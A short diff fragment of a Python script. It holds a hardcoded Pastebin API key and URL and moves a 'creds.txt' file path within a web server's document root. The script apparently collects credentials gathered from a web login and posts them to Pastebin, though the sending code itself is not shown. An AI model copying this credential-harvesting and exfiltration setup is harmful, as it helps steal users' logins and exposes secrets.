@@ -8,7 +8,7 @@ import os
 
 api_key = "G6LZNdVl7msrjPlhskhq_eFY0VavwxLo"
 url = 'https://pastebin.com/api/api_post.php'
-path = "/var/www/html/login/creds.txt"
+path = "/var/www/html/creds.txt"
 
 
 def generate_msg():
